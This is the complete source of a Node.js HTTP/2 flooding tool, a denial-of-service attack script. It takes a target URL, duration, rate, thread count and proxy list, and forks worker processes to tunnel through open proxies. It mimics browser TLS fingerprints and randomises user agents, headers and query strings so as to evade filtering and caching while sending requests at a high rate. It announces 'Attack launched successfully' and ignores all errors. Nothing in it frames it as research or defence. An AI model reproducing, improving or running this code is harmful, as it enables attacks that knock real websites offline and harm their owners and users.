const net = require("net");
const http2 = require("http2");
const tls = require("tls");
const cluster = require("cluster");
const url = require("url");
const crypto = require("crypto");
const fs = require("fs");
const os = require("os");

const defaultCiphers = crypto.constants.defaultCoreCipherList.split(":");
const ciphers = "GREASE:" + [
    defaultCiphers[2],
    defaultCiphers[1],
    defaultCiphers[0],
    ...defaultCiphers.slice(3)
].join(":");

const acceptHeader = [
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8',
    'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
];

const cacheHeader = [
    'max-age=0',
    'no-cache',
    'no-store',
    'must-revalidate',
    'proxy-revalidate',
    'no-cache, no-store,private, max-age=0, must-revalidate',
];

const languageHeader = [
    'en-US,en;q=0.9',
    'en-GB,en;q=0.8',
    'fr-FR,fr;q=0.9',
    'de-DE,de;q=0.8',
    'es-ES,es;q=0.9',
    'it-IT,it;q=0.8',
    'ja-JP,ja;q=0.9',
    'zh-CN,zh;q=0.9',
    'ru-RU,ru;q=0.8',
    'pt-BR,pt;q=0.9',
];

const fetchSite = [
    "same-origin",
    "same-site",
    "cross-site",
    "none"
];

const fetchMode = [
    "navigate",
    "same-origin",
    "no-cors",
    "cors",
];

const fetchDest = [
    "document",
    "subresource",
    "unknown",
];

const cipherList = [
    "TLS_AES_128_GCM_SHA256",
    "TLS_AES_256_GCM_SHA384",
    "TLS_CHACHA20_POLY1305_SHA256",
];

var currentCipher = cipherList[Math.floor(Math.random() * cipherList.length)];

process.setMaxListeners(0);
require("events").EventEmitter.defaultMaxListeners = 0;

const signatureAlgorithms = [
    "ecdsa_secp256r1_sha256",
    "rsa_pss_rsae_sha256",
    "rsa_pkcs1_sha256",
    "ecdsa_secp384r1_sha384",
];

let signatureAlgorithmsList = signatureAlgorithms.join(':');
const ecdhCurve = "GREASE:X25519:x25519:P-256";

const secureOptions =
    crypto.constants.SSL_OP_NO_SSLv2 |
    crypto.constants.SSL_OP_NO_SSLv3 |
    crypto.constants.SSL_OP_NO_TLSv1 |
    crypto.constants.SSL_OP_NO_TLSv1_1 |
    crypto.constants.ALPN_ENABLED |
    crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
    crypto.constants.SSL_OP_SINGLE_ECDH_USE;

if (process.argv.length < 7) {
    console.log(`Usage: host time req thread proxy.txt`);
    process.exit();
}

const secureProtocol = "TLSv1_2_method";
const headers = {};

const secureContextOptions = {
    ciphers: ciphers,
    sigalgs: signatureAlgorithmsList,
    honorCipherOrder: true,
    secureOptions: secureOptions,
    secureProtocol: secureProtocol
};

const secureContext = tls.createSecureContext(secureContextOptions);

const args = {
    target: process.argv[2],
    time: ~~process.argv[3],
    rate: ~~process.argv[4],
    threads: ~~process.argv[5],
    proxyFile: process.argv[6]
};

var proxies = readLines(args.proxyFile);
const parsedTarget = url.parse(args.target);

const maxRamPercentage = 85;
const restartDelay = 500;

if (cluster.isMaster) {
    console.log(`Target: ${process.argv[2]}`);
    console.log(`Duration: ${process.argv[3]} seconds`);
    console.log(`Rate: ${process.argv[4]} req/s`);
    console.log(`Threads: ${process.argv[5]}`);
    console.log(`Proxy File: ${process.argv[6]}`);
    console.log(`Attack launched successfully`);

    const restartScript = () => {
        for (const id in cluster.workers) {
            cluster.workers[id].kill();
        }
        console.log(`Restarting in ${restartDelay} ms...`);
        setTimeout(() => {
            for (let counter = 1; counter <= args.threads; counter++) {
                cluster.fork();
            }
        }, restartDelay);
    };

    const handleRamUsage = () => {
        const totalRam = os.totalmem();
        const usedRam = totalRam - os.freemem();
        const ramPercentage = (usedRam / totalRam) * 100;

        if (ramPercentage >= maxRamPercentage) {
            console.log(`Max RAM usage: ${ramPercentage.toFixed(2)}%`);
            restartScript();
        }
    };

    setInterval(handleRamUsage, 3000);

    for (let counter = 1; counter <= args.threads; counter++) {
        cluster.fork();
    }
} else {
    setInterval(runFlooder, 100);
}

class NetSocket {
    constructor() {}

    http(options, callback) {
        const parsedAddr = options.address.split(":");
        const payload = "CONNECT " + options.address + ":443 HTTP/1.1\r\nHost: " + options.address + ":443\r\nConnection: Keep-Alive\r\n\r\n";
        const buffer = new Buffer.from(payload);
        const connection = net.connect({
            host: options.host,
            port: options.port,
        });

        connection.setTimeout(options.timeout * 10000);
        connection.setKeepAlive(true, 10000);
        connection.setNoDelay(true);

        connection.on("connect", () => {
            connection.write(buffer);
        });

        connection.on("data", chunk => {
            const response = chunk.toString("utf-8");
            const isAlive = response.includes("HTTP/1.1 200");
            if (isAlive === false) {
                connection.destroy();
                return callback(undefined, "error: invalid response from proxy server");
            }
            return callback(connection, undefined);
        });

        connection.on("timeout", () => {
            connection.destroy();
            return callback(undefined, "error: timeout exceeded");
        });
    }
}

const netSocket = new NetSocket();

function readLines(filePath) {
    return fs.readFileSync(filePath, "utf-8").toString().split(/\r?\n/);
}

function randomInt(min, max) {
    return Math.floor(Math.random() * (max - min + 1)) + min;
}

function randomElement(elements) {
    return elements[randomInt(0, elements.length)];
}

function randomString(length) {
    const characters = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789";
    let result = "";
    const charactersLength = characters.length;
    for (let i = 0; i < length; i++) {
        result += characters.charAt(Math.floor(Math.random() * charactersLength));
    }
    return result;
}

function generateRandomString(minLength, maxLength) {
    const characters = 'ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789';
    const length = Math.floor(Math.random() * (maxLength - minLength + 1)) + minLength;
    const randomStringArray = Array.from({ length }, () => {
        const randomIndex = Math.floor(Math.random() * characters.length);
        return characters[randomIndex];
    });
    return randomStringArray.join('');
}

function runFlooder() {
    const proxyCount = randomInt(10, 20);

    for (let i = 0; i < proxyCount; i++) {
        const proxyAddr = randomElement(proxies);
        const parsedProxy = proxyAddr.split(":");
        const parsedPort = parsedTarget.protocol === "https:" ? "443" : "80";
        const systems = [
            "Windows 10",
            "Windows 11",
            "macOS Ventura 13.6",
            "macOS Sonoma 14.2",
            "Ubuntu 22.04",
            "Ubuntu 24.04",
            "iOS 17.2",
            "iOS 18.1",
            "Android 13",
            "Android 14",
            "Linux Mint 21.3",
            "Fedora 40",
        ];
        const browsers = [
            "Chrome/129.0." + randomString(4),
            "Firefox/130.0." + randomString(3),
            "Safari/17." + randomString(2),
            "Edge/129.0." + randomString(4),
            "Opera/115." + randomString(3),
            "Vivaldi/6." + randomString(3),
            "UCBrowser/13." + randomString(3),
            "Brave/" + randomString(4),
            "TorBrowser/13." + randomString(3),
            "Puffin/10." + randomString(3),
        ];
        const engines = [
            "AppleWebKit/537.36 (KHTML, like Gecko)",
            "Gecko/20100101",
            "WebKit/605.1." + randomString(2),
            "Blink/129.0." + randomString(4),
            "Presto/2.12." + randomString(3),
        ];
        const devices = [
            "Win64; x64",
            "Macintosh; Intel Mac OS X " + randomString(2) + "_" + randomString(1),
            "iPhone; CPU iPhone OS " + randomString(2) + "_" + randomString(1) + " like Mac OS X",
            "Linux; x86_64",
            "Android " + randomString(2) + "; SM-G" + randomString(4),
            "iPad; CPU OS " + randomString(2) + "_" + randomString(1) + " like Mac OS X",
        ];
        const system = randomElement(systems);
        const browser = randomElement(browsers);
        const engine = randomElement(engines);
        const device = randomElement(devices);
        const randomVersion = randomString(3);
        const userAgents = [
            `${browser} (${system}; ${device}) ${engine} ${randomVersion}`,
            `${browser}/${randomVersion} (${system}; ${device}) ${engine}`,
            `${randomString(6)}/1.${randomString(2)} (${system}) ${engine} ${browser}`,
            `${browser} (${device}; ${system}) ${engine}/${randomVersion}`,
            `${randomString(5)}Browser/${randomVersion} (${system}) ${engine} ${randomString(4)}`,
            `${browser}/202${randomString(2)}.${randomString(3)} (${system}; ${device}) ${engine}`,
            `${randomString(7)}/${randomVersion} (${system}) ${engine} Safari/537.${randomString(2)}`,
            `${browser} (${system}; ${device}) ${randomString(6)}/1.${randomString(2)} ${engine}`,
            `${randomString(5)}Web/2.${randomString(2)} (${system}) ${engine} ${browser}`,
            `${browser}/${randomString(4)} (${device}; ${system}) ${engine}/${randomVersion}`,
            `${randomString(6)}Client/${randomVersion} (${system}) ${engine} ${randomString(5)}`,
            `${browser} (${system}) ${engine}/${randomVersion} ${randomString(4)}/1.${randomString(2)}`,
            `${randomString(5)}Surf/${randomVersion} (${system}; ${device}) ${engine}`,
            `${browser}/${randomString(3)} (${system}) ${engine} ${randomString(6)}/2.${randomString(2)}`,
            `${randomString(7)}/${randomVersion} (${device}; ${system}) ${engine}`,
            `${browser} (${system}; ${device}) ${engine}/${randomString(4)} ${randomString(5)}`,
            `${randomString(6)}Browser/${randomVersion} (${system}) ${engine}/${randomString(3)}`,
            `${browser}/${randomVersion} (${system}; ${device}) ${randomString(5)}/1.${randomString(2)}`,
            `${randomString(5)}/${randomString(3)} (${system}) ${engine} ${browser}/${randomVersion}`,
            `${browser} (${system}; ${device}) ${engine} ${randomString(6)}Client/${randomVersion}`,
        ];
        const ua = randomElement(userAgents);

        encodingHeader = [
            'gzip, deflate, br',
            'deflate, gzip',
            'br',
        ];

        const val = {
            'NEL': JSON.stringify({
                "report_to": Math.random() < 0.5 ? "cf-nel" : 'default',
                "max-age": 604800,
                "include_subdomains": Math.random() < 0.5
            })
        };

        const rateHeaders = [
            {"accept": acceptHeader[Math.floor(Math.random() * acceptHeader.length)]},
            {"accept-language": languageHeader[Math.floor(Math.random() * languageHeader.length)]},
            {"origin": "https://" + parsedTarget.host},
            {"X-Forwarded-For": parsedProxy[0]},
            {"NEL": val},
            {"dnt": "1"},
            {"te": "trailers"},
        ];

        let headers = {
            ":authority": parsedTarget.host,
            ":scheme": "https",
            ":path": parsedTarget.path + "?" + randomString(3) + "=" + generateRandomString(10, 25),
            ":method": "GET",
            "accept-encoding": encodingHeader[Math.floor(Math.random() * encodingHeader.length)],
            "cache-control": cacheHeader[Math.floor(Math.random() * cacheHeader.length)],
            "sec-fetch-mode": fetchMode[Math.floor(Math.random() * fetchMode.length)],
            "sec-fetch-site": fetchSite[Math.floor(Math.random() * fetchSite.length)],
            "sec-fetch-dest": fetchDest[Math.floor(Math.random() * fetchDest.length)],
            "user-agent": ua,
        };

        const proxyOptions = {
            host: parsedProxy[0],
            port: ~~parsedProxy[1],
            address: parsedTarget.host + ":443",
            timeout: 5
        };

        netSocket.http(proxyOptions, (connection, error) => {
            if (error) return;

            connection.setKeepAlive(true, 10000);
            connection.setNoDelay(true);

            const settings = {
                enablePush: false,
                initialWindowSize: 6291456,
                maxFrameSize: 16384,
            };

            const tlsOptions = {
                port: parsedPort,
                secure: true,
                ALPNProtocols: ["h2"],
                ciphers: currentCipher,
                sigalgs: signatureAlgorithms,
                requestCert: true,
                socket: connection,
                ecdhCurve: ecdhCurve,
                honorCipherOrder: false,
                rejectUnauthorized: false,
                secureOptions: secureOptions,
                secureContext: secureContext,
                host: parsedTarget.host,
                servername: parsedTarget.host,
                secureProtocol: secureProtocol
            };

            const tlsConn = tls.connect(parsedPort, parsedTarget.host, tlsOptions);

            tlsConn.allowHalfOpen = true;
            tlsConn.setNoDelay(true);
            tlsConn.setKeepAlive(true, 10000);
            tlsConn.setMaxListeners(0);

            const client = http2.connect(parsedTarget.href, {
                settings: {
                    headerTableSize: 65536,
                    maxHeaderListSize: 16384,
                    initialWindowSize: 6291456,
                    maxFrameSize: 16384,
                },
                createConnection: () => tlsConn
            });

            client.setMaxListeners(0);
            client.settings(settings);

            client.on("connect", () => {
                const intervalAttack = setInterval(() => {
                    for (let i = 0; i < args.rate / proxyCount; i++) {
                        const dynHeaders = {
                            ...headers,
                            ...rateHeaders[Math.floor(Math.random() * rateHeaders.length)],
                        };

                        const request = client.request({
                            ...dynHeaders,
                        }, {
                            parent: 0,
                            exclusive: true,
                            weight: 256,
                        })
                        .on('response', response => {
                            request.close(http2.constants.NGHTTP2_NO_ERROR);
                            request.destroy();
                        });
                        request.end();
                    }
                }, 100);
            });

            client.on("close", () => {
                client.destroy();
                tlsConn.destroy();
                connection.destroy();
            });

            client.on("timeout", () => {
                client.destroy();
                connection.destroy();
            });

            client.on("error", error => {
                client.destroy();
                connection.destroy();
            });
        });
    }
}

const stopScript = () => process.exit(1);

setTimeout(stopScript, args.time * 1000);

process.on('uncaughtException', error => {});
process.on('unhandledRejection', error => {});
